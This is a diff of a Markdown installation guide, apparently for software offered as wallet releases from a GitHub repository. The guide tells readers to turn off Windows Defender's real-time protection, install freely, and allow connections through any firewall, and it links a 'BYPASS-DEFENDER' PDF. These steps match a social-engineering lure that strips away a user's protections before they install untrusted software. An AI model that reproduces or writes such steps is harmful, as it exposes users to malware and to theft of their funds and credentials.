@@ -65,6 +65,8 @@ If you believe that a file you downloaded is genuine, you can bypass the **“Op
 
 6) You’ll be redirected to a new page. Here, **click on the Real-time protection toggle to turn off Windows Defender**.
 
+Then you should be able to download and install freely. You can even activate Windows Defender after installation. Ensure to allow connections through any firewall.
+
 For a PDF menu navigation guide, see here: https://github.com/UnvsCom/Current-Wallet-Releases/blob/main/BYPASS-DEFENDER.pdf
 
 
